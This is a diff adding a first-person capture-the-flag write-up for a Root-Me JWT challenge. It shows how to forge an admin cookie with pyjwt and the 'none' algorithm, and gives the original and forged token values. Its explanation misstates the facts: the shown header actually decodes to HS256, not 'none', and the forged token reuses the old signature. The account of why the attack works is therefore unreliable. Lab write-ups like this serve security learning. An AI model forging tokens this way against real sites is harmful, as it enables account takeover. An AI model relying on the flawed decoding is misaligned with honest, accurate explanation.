@@ -1,0 +1,58 @@
+Challenge : To validate the challenge, connect as admin.
+Site : http://challenge01.root-me.org/web-serveur/ch58/index.php
+
+1: I browse the site and found login page but i don't know username and password. I found the "login as guest" link on the form and clicked it.
+2: It's logged in with "guest" user. This page is controlled Cookie by "JWT". So, i opened "Inspect option" on browser, go to "Application" and find the "JWT cookie".
+3: Cookie name is "jwt" value is below:
+Cookie value:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
+Cookie value:
+4: In this case, i need to know how JWT cookie work? Here is explanation.
+JWT explanation:
+JWTs have 3 parts : HEADER . PAYLOAD . SIGNATURE
+
+ENCODED FORMAT:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 : HEADER
+eyJ1c2VybmFtZSI6Imd1ZXN0In0 : PAYLOAD
+OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk : SIGNATURE
+
+DECODED FORMAT:
+HEADER
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+
+"alg": "none" means the token should not have a signature
+
+"typ": "JWT" means it's a JSON Web Token
+
+PAYLOAD
+{
+  "username": "guest"
+}
+
+This is the data/claim — in this case, it says the user is guest.
+
+SIGNATURE
+The HEADER says "alg": "none" — which means no signature is expected — but a signature is still present. If i decode the signature, i'll need the secret key.
+In this case, i don't need the secret key coz of HEADER say "alg": "none" and neglected that.
+JWT explanation:
+
+5: So, in this JWT cookie i can neglect the last part. I must generate JWT key as "{'username': 'admin'}, key='', algorithm='none'" and i will substitute the generated
+value to above JWT cookie. So let's start and i'll use python to generate JWT token. Code is below.
+Python Code:
+pip3 install pyjwt
+python3
+import jwt
+token = jwt.encode({'username': 'admin'}, key='', algorithm='none')
+print(token)
+Python Code:
+
+6: Copy the key and substitue the cookie "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk"
+as "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk" and replace this cookie value in site.
+
+7: I got the FLAG.
+
+
+
